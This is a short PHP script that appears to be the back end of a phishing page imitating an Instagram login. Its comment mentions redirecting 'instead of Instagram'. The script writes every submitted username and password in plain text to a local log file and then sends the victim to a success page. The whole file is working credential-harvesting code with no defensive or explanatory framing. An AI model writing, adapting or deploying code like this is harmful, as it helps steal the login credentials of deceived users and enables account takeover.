<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: " . $_POST['username'] . "\n");
    fwrite($file, "Password: " . $_POST['password'] . "\n\n");
    fclose($file);

    // Redirect to a local image page instead of Instagram
    header("Location: success.html");
    exit();
}
?>
